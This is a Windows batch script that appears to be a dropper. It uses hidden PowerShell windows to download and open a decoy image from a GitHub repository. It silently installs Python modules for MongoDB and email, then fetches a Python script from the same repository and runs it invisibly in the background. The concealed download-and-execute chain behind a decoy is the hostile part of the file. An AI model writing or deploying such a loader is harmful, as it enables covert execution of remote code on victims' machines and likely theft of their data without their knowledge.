@echo off
cd /d "%userprofile%\Downloads"

REM Downloading the image
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3rr0r-505/jongoDB/main/jongo.png', 'jongo.png'); Invoke-Item -Path '.\jongo.png'"

REM Installing Python modules
python -m pip install pymongo smtplib >nul 2>&1

REM Downloading the Python script
powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/3rr0r-505/jongoDB/main/jongoDB.py', 'jongoDB.py')"

REM Executing the Python script in the background
start "" /B pythonw jongoDB.py

exit